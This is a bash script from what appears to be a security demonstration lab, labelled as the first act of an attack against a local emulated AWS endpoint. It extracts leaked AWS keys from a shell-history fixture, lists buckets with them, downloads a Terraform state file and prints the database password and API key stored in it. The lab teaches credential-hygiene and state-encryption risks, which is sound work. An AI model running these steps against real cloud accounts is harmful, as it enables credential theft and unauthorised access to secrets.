#!/usr/bin/env bash
# Act 1 of the attack: state leak.
#
# Story: a developer typed AWS credentials into their shell history; that
# history leaked. The attacker uses the stolen keys to reach the demo's AWS
# endpoint and pulls the Terraform state object, which stores the runtime
# secrets in plaintext.
#
# Runs against the demo endpoint only and goes nowhere else
# (scripts/check/ports-and-secrets.sh enforces that).
set -euo pipefail
here="$(cd "$(dirname "$0")" && pwd)"
ENDPOINT=http://localhost:4566
BUCKET=acme-shop-tfstate
STATE_KEY=vulnerable/acme-shop.tfstate
CREDENV="$here/.stolen-creds.env"

fail() { echo "FAIL $*"; exit 1; }

echo "act 1: state leak"
echo
echo "1. leaked credentials found in shell history"
grep -n 'AWS_' "$here/history-leak/bash-history" | sed 's/^/    /'
grep -E '^export AWS_(ACCESS_KEY_ID|SECRET_ACCESS_KEY)=' "$here/history-leak/bash-history" \
  | sed 's/^export //' > "$CREDENV"
# shellcheck source=/dev/null
set -a
source "$CREDENV"
set +a
export AWS_REGION=us-east-1
echo "OK  credentials extracted to .stolen-creds.env (regenerated per run)"

echo
echo "2. probe the target's API with the stolen keys"
buckets=$(aws --endpoint-url "$ENDPOINT" s3api list-buckets \
  --query 'Buckets[].Name' --output text 2>/dev/null) \
  || fail "target API unreachable at $ENDPOINT"
echo "$buckets" | tr '\t' '\n' | grep -Fqx "$BUCKET" \
  || fail "could not find $BUCKET among: $buckets"
echo "OK  authenticated as the leaked identity; state bucket found: $BUCKET"

echo
echo "3. read the terraform state object unencrypted from the bucket"
tmpstate="$(mktemp)"
trap 'rm -f "$tmpstate"' EXIT
aws --endpoint-url "$ENDPOINT" s3api get-object \
  --bucket "$BUCKET" --key "$STATE_KEY" "$tmpstate" >/dev/null \
  || fail "could not read s3://$BUCKET/$STATE_KEY"
echo "OK  pulled s3://$BUCKET/$STATE_KEY"

echo
echo "4. read the deployment secrets straight out of the state file"
secrets=$(jq -r '
  .resources[] | select(.type == "aws_ssm_parameter")
  | .instances[0].attributes.value' \
  "$tmpstate" 2>/dev/null || true)
if test -z "$secrets"; then
  fail "no aws_ssm_parameter values found in state"
fi
echo "$secrets" | while read -r v; do echo "    stolen: $v"; done
echo "OK  database password and API key extracted from terraform.tfstate"
exit 0